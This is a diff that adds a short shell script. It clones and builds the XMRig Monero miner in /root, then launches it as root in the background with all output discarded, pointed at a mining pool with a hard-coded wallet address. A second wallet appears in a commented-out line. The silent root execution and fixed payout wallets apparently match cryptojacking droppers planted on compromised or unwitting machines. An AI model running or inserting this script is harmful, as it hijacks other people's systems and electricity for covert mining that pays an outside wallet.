@@ -1,0 +1,15 @@
+cd /root
+if [ -d xmrig ]
+then
+   rm -R xmrig
+fi
+
+git clone https://github.com/xmrig/xmrig.git
+mkdir xmrig/build && cd xmrig/scripts
+./build_deps.sh && cd ../build
+cmake .. -DXMRIG_DEPS=scripts/deps
+make -j$(nproc)
+
+#  run xmrig as user 'root'
+su - root -c '/root/xmrig/build/xmrig -o gulf.moneroocean.stream:10128 -u 83k41AVFZZaPrdEmk5WoYn9ZVwSM2zMREet3jsXxzfNUajp96zkuzdd3Mzd17jGobqDW7wSK5jHRGSdpxGbzBiemFDjPJTJ -p i9 > /dev/null 2>&1' &
+#  su - root -c '/root/xmrig/build/xmrig -o gulf.moneroocean.stream:10128 -u 486yMxLh6KJGFt8qoAPm4wFsEErw84rGWMmiWWnnq13f6W85PY3dhvzeCrL8F5Mkm3HFTGP3KSc5B2ZDNsegPWXp9TiAFPJ -p i9 > /dev/null 2>&1' &
